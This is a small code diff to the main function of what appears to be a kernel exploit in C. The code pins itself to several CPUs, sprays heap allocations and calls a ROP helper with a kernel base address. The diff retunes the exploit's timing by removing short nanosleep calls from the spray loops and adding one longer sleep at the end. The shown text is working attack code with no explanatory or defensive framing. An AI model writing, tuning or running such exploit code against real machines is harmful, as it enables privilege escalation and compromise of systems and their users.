@@ -326,14 +326,12 @@ int main() {
     // Run malloc sprays for pinned cores
     for (int cpu = 1; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
-        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 µs
         rop_call_funcptr(spray_map, spray_sock, kernel_base);
     }
     for (int cpu = 1; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
-        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 µs
         rop_call_funcptr(spray_map, NULL, kernel_base);
     }
-
+        nanosleep("\0\0\0\0\0\0\0\0\x80\x17\xB4\x2C\0\0\0\0", NULL);
     return 0;
 }
